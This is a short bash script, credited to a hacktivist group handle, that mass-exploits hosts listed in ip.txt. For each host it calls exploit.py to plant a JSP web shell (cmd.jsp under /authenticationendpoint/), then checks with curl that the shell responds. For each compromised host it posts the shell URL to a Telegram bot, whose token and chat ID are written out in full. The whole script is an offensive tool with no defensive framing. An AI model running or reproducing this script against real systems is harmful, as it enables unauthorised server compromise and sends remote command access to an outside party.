#!/bin/bash

Y="\033[133m"
G="\033[032m"
M="\033[031m"
R="\033[0m"
VERSION="1.0"
AUTHOR="DirbusterX"
FORUM="DragonForce Malaysia | @dragonforce.io"

for host in `cat ip.txt`;
	do echo "Checking $host";
	#echo $ip | python3 cve.py $ip cmd.jsp;
	python3 exploit.py $host cmd.jsp;
	shell_check=$(curl -s -k $host/authenticationendpoint/cmd.jsp | grep -oE 'submit')
	#if [ $(curl -s -k $host/authenticationendpoint/cmd.jsp | grep -oE 'submit') ] = [ 'submit' ]; then
	if [ "$shell_check" = "submit" ]; then
		echo -e "[$G Success $R] $host/authenticationendpoint/cmd.jsp?cmd=whoami";
		stringholder="Success : $host/authenticationendpoint/cmd.jsp?cmd=whoami"
		curl --data chat_id="-1001580319070" --data-urlencode "text=${stringholder}" "https://api.telegram.org/bot5234136125:AAHvvlyKSkijHlpOpBMcI2rRAvOOzlOInC0/sendMessage?parse_mode"
		echo ''
	else
		echo -e "[$M Failed $R] $host";
		echo ''
	fi
done
